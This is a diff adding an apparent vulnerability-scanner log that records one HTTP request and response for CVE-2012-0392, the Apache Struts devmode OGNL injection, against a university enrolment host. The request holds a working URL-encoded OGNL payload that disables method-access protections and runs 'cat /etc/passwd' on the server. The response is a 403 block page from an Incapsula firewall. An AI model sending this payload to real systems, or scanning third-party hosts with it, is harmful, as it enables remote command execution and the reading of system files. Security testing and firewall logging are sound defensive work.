@@ -1,0 +1,24 @@
+[CVE-2012-0392] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+
+
+GET /devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream())) HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2012-0392] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 831
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3211538=MCaDECXvQzOjh3RoWzg2wgxyk2gAAAAAQUIPAAAAAACStq1988yY1jmECaiGJdLW; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=ByuBdmW3nzB/6barov5JAwxyk2gAAAAAjBTQeFJT0h567ZQZ2hKNzA==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 10-8314102-0 0NNN RT(1754493453269 9) q(0 -1 -1 -1) r(0 -1) B15(3,900055,0) U18
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/Front-Night-supt-I-keepe-mans-his-rauing-it-of-N" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=10-8314102-0%200NNN%20RT%281754493453269%209%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%283%2c900055%2c0%29%20U18&incident_id=237000430032587158-42329307899300554&edet=15&cinfo=03000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032587158-42329307899300554</iframe></body></html>
